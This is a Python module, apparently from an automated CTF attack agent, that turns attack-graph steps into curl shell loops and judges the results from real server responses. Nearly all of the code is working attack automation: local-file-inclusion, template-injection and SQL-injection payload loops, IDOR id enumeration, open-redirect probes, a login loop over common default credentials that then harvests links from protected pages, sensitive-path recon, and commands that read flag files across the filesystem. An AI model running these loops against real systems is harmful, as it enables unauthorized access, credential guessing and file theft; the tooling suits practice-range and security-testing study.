"""把攻击图的边渲染成命令，并从真实响应里判定结果。

职责刻意拆开（garak 的 probe/detector 配对）：
- `render` 只产出命令，不关心结果；
- `judge` 只吃真实字节，不看模型自述。

这样「模型说自己成功了」永远不会被当成成功。
"""
from __future__ import annotations

import re
import shlex

from .attack_graph import (
    IDOR_IDS,
    LFI_PAYLOADS,
    REDIRECT_PAYLOADS,
    SQLI_PAYLOADS,
    SSTI_PAYLOADS,
    Edge,
    Entry,
)

# 会话文件固定路径：所有 curl 都带 -b/-c 同一个 jar，登录一次全局可用。
SESSION_FILE = "/tmp/.deepsick_cj"
SCRATCH = "/tmp/.deepsick_out"

# 少量常见凭据。不做字典爆破——靶场里爆破最先触发主动防御，而且容易把题打死。
COMMON_CREDS = (
    "employee:employee123",
    "employee:employee",
    "admin:admin",
    "admin:password",
    "admin:123456",
    "admin:admin123",
    "test:test",
    "user:user",
    "guest:guest",
)

FLAG_RE = re.compile(r"flag\{[0-9a-zA-Z_\-]{6,}\}", re.I)
LFI_PROOF = re.compile(r"root:x:0:0:")
SQLI_ERROR = re.compile(
    r"SQL syntax|mysql_fetch|mysqli|ORA-\d{4}|SQLite3?::|unclosed quotation|"
    r"quoted string not properly terminated|PG::SyntaxError|syntax error at or near|"
    r"SQLSTATE|You have an error in your SQL", re.I)
SSTI_PROOF = re.compile(r"(?<![\d.])49(?![\d.])")


def _q(value: str) -> str:
    """shell 单引号转义。payload 里带引号是常态（SQL 注入），必须走这个。"""
    return shlex.quote(value)


def _curl_get(url: str, param: str, payload: str) -> str:
    # 带上 redirect_url 是必须的：未登录时服务端 302 到 login，只看状态码分不清
    # 「这个族打不通」和「压根没权限」，会把边误关掉（a-05 的 download.php 就是）。
    #
    # 参数名用单引号、值用双引号是刻意的：`'id'="$p"` 才能让 shell 把循环变量
    # 展开。之前写成 `--data-urlencode 'id=$p'`（整体单引号），$p 不展开，
    # curl 收到的是字面量 "id=$p"，LFI 整族会静默失效。
    return (f"curl -sS -b {SESSION_FILE} -c {SESSION_FILE} -o {SCRATCH} "
            f"-w '%{{http_code}} %{{size_download}} %{{redirect_url}}' --get "
            f"--data-urlencode {_q(param)}=\"{payload}\" {_q(url)}")


def _curl_post(url: str, pairs: dict[str, str]) -> str:
    data = "&".join(f"{k}={v}" for k, v in pairs.items())
    return (f"curl -sS -b {SESSION_FILE} -c {SESSION_FILE} -o {SCRATCH} "
            f"-w '%{{http_code}} %{{size_download}}' -d {_q(data)} {_q(url)}")


def _first_param(entry: Entry, kinds: tuple[str, ...]) -> str | None:
    for name, kind in entry.params.items():
        if kind in kinds:
            return name
    return None


def _url(base_url: str, entry: Entry) -> str:
    return base_url.rstrip("/") + entry.path


def render(edge: Edge, base_url: str) -> str | None:
    """渲染成一条单行命令。返回 None 表示这条边当前没法确定性执行。"""
    entry = edge.entry

    if edge.family == "lfi" and entry:
        name = _first_param(entry, ("file",)) or "file"
        url = _url(base_url, entry)
        parts = [f"for p in {' '.join(_q(p) for p in LFI_PAYLOADS)}; do "
                 f"printf '### %s ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                 f"head -c 300 {SCRATCH}; echo; done"]
        return " ; ".join(parts)

    if edge.family == "ssti" and entry:
        name = _first_param(entry, ("search",)) or "q"
        url = _url(base_url, entry)
        return (f"for p in {' '.join(_q(p) for p in SSTI_PAYLOADS)}; do "
                f"printf '### %s => ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                f"head -c 200 {SCRATCH}; echo; done")

    if edge.family == "sqli" and entry:
        name = _first_param(entry, ("search", "id")) or "q"
        url = _url(base_url, entry)
        return (f"for p in {' '.join(_q(p) for p in SQLI_PAYLOADS)}; do "
                f"printf '### %s => ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                f"grep -aiE 'SQL syntax|SQLSTATE|syntax error|quotation' {SCRATCH} | head -2; done")

    if edge.family == "idor" and entry:
        name = _first_param(entry, ("id",)) or "id"
        url = _url(base_url, entry)
        return (f"for p in {' '.join(IDOR_IDS)}; do "
                f"printf '### id=%s => ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                f"head -c 160 {SCRATCH}; echo; done")

    if edge.family == "open_redirect" and entry:
        name = _first_param(entry, ("redirect",)) or "next"
        url = _url(base_url, entry)
        return (f"for p in {' '.join(_q(p) for p in REDIRECT_PAYLOADS)}; do "
                f"printf '### %s => ' \"$p\"; "
                f"curl -sS -b {SESSION_FILE} -o /dev/null -w '%{{http_code}} %{{redirect_url}}' "
                f"--get --data-urlencode {_q(name + '=')}"
                f"\"$p\" {_q(url)}; echo; done")

    if edge.family == "auth" and entry:
        url = _url(base_url, entry)
        user_param = "username"
        pass_param = "password"
        for name in entry.params:
            if name.lower() in ("user", "username", "email", "account", "uname"):
                user_param = name
            if name.lower() in ("pass", "password", "pwd", "passwd"):
                pass_param = name
        creds = " ".join(_q(c) for c in COMMON_CREDS)
        # 登录成功后必须顺手把受保护页面里的入口抓出来——否则图是空的，
        # 下一步又只能靠模型瞎猜。这一步合进同一条命令，不额外花步数。
        harvest = (" ; for u in / /dashboard.php /dashboard /index.php /home /profile.php; do "
                   f"printf '=== %s ' \"$u\"; "
                   f"curl -sS -b {SESSION_FILE} -o /tmp/.deepsick_page "
                   f"-w '%{{http_code}} %{{size_download}}' "
                   "\"$BASE$u\"; echo; "
                   "grep -oE 'href=\"[^\"]+\"|action=\"[^\"]+\"' /tmp/.deepsick_page "
                   "| grep -vE 'https?://|#|\\.css|\\.js' | head -30; done")
        return (f"BASE={_q(base_url.rstrip('/'))} ; for c in {creds}; do "
                f"u=\"${{c%%:*}}\"; pw=\"${{c##*:}}\"; "
                f"rm -f {SESSION_FILE}; "
                f"r=$(curl -sS -c {SESSION_FILE} -o /dev/null "
                f"-w '%{{http_code}} %{{redirect_url}}' "
                f"-d {_q(user_param + '=')}\"$u\" -d {_q(pass_param + '=')}\"$pw\" "
                f"{_q(url)}); printf '%s => %s\\n' \"$c\" \"$r\"; "
                f"case \"$r\" in 30*) case \"$r\" in *login*) ;; *) "
                f"echo LOGIN_OK \"$c\"; break;; esac;; esac; "
                f"done" + harvest)

    if edge.family == "recon":
        # 一次打完一整批敏感路径；命中的路径把正文一并打出来，图据此长出新入口。
        # 这是图的自愈动作：具体边全打空后回到侦察，而不是停在原地。
        from . import sense
        arr = " ".join(_q(p) for p in sense.PROBE_PATHS)
        return (f"BASE={_q(base_url.rstrip('/'))} ; "
                f"for p in {arr}; do "
                f"c=$(curl -sS -b {SESSION_FILE} -o {SCRATCH} -w '%{{http_code}}' "
                f"\"$BASE$p\"); printf '%s %s\\n' \"$p\" \"$c\"; "
                f"case \"$c\" in 404|'') ;; *) head -c 3000 {SCRATCH}; echo;; esac; "
                f"done")

    if edge.family == "flag_hunt":
        # 已经有 file_read：用它自己的入口读 flag 位置，这是最短路径
        if edge.entry is not None and edge.entry.params:
            name = _first_param(edge.entry, ("file",)) or "file"
            url = _url(base_url, edge.entry)
            return (f"for p in {' '.join(_q(p) for p in LFI_PAYLOADS)}; do "
                    f"printf '### %s ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                    f"grep -aoE 'flag\\{{[^}}]+\\}}' {SCRATCH} | head -2; done")
        # 有 rce：一条命令把常见 flag 位置读完
        return ("cat /challenge/flag.txt /flag /flag.txt /root/flag.txt "
                "/flag_is_here /home/*/flag* 2>/dev/null; "
                "ls -la /challenge 2>/dev/null; "
                "find / -maxdepth 3 -iname '*flag*' 2>/dev/null | head")

    return None


def judge(edge: Edge, output: str) -> dict:
    """从真实输出判定这条边的结果。

    返回 {state, flags, caps, note}：
      state: worked / failed / inconclusive
      caps:  应该新加到图上的能力 [(kind, via, detail)]
    """
    body = output or ""
    flags = FLAG_RE.findall(body)
    caps: list[tuple[str, str, str]] = []
    note = ""

    if flags:
        return {"state": "worked", "flags": flags, "caps": caps,
                "note": f"命中 Flag {flags[0]}"}

    # 整族都被 302 到登录页：这不是「这个漏洞族不存在」，而是「还没权限」。
    # 两者必须分开，否则登录成功后的重开机制就失效了——a-05 的 download.php
    # 在未登录时正是 302，如果判成 failed，拿到会话后这条边也不会再被派发。
    if edge.family != "auth" and re.search(r"30[127]\s+\S*login", body, re.I):
        return {"state": "auth_required", "flags": flags, "caps": caps,
                "note": "需要登录才能打；登录成功后这条边会重新派发"}

    if edge.family == "lfi":
        if LFI_PROOF.search(body):
            caps.append(("file_read", edge.entry.key if edge.entry else "global",
                         f"{edge.entry.path if edge.entry else ''} 可读任意文件"))
            note = "确认任意文件读取（读到 /etc/passwd）"
            return {"state": "worked", "flags": flags, "caps": caps, "note": note}
        return {"state": "failed", "flags": flags, "caps": caps,
                "note": "路径穿越无回显"}

    if edge.family == "ssti":
        if SSTI_PROOF.search(body):
            return {"state": "worked", "flags": flags, "caps": caps,
                    "note": "模板表达式被求值（7*7=49）"}
        return {"state": "failed", "flags": flags, "caps": caps, "note": "未见求值结果"}

    if edge.family == "sqli":
        if SQLI_ERROR.search(body):
            caps.append(("db_error", edge.entry.key if edge.entry else "global",
                         "SQL 报错泄露"))
            return {"state": "worked", "flags": flags, "caps": caps,
                    "note": "确认 SQL 注入（有报错）"}
        return {"state": "failed", "flags": flags, "caps": caps, "note": "无报错特征"}

    if edge.family == "auth":
        if "LOGIN_OK" in body:
            caps.append(("auth", "session", body.split("LOGIN_OK", 1)[1].strip()[:60]))
            return {"state": "worked", "flags": flags, "caps": caps,
                    "note": "登录成功，会话已写入 " + SESSION_FILE}
        return {"state": "failed", "flags": flags, "caps": caps, "note": "常见凭据均未登录成功"}

    if edge.family == "open_redirect":
        match = re.search(r"30[127]\s+http://example\.com", body)
        if match:
            return {"state": "worked", "flags": flags, "caps": caps,
                    "note": "跳转参数未校验"}
        return {"state": "failed", "flags": flags, "caps": caps, "note": "未见外部跳转"}

    if edge.family == "flag_hunt":
        return {"state": "failed" if body.strip() else "inconclusive",
                "flags": flags, "caps": caps, "note": "未读到 flag"}

    return {"state": "inconclusive", "flags": flags, "caps": caps, "note": ""}
